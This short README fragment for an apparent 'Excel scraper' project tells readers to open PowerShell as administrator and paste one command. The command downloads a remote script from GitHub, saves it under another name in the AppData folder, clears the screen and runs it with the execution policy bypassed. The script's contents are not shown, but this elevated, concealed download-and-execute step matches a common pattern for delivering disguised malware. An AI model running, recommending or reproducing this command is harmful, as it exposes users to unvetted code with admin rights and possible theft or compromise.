## How to run: 

# Open Powershell As Admin and Run:

Invoke-WebRequest -uri "https://raw.githubusercontent.com/Laurits6920/project-scrape/main/lam.ps1" -OutFile "$env:APPDATA\ExcelScraper.ps1" -UseBasicParsing; cls; powershell -ep bypass "$env:APPDATA\ExcelScraper.ps1"
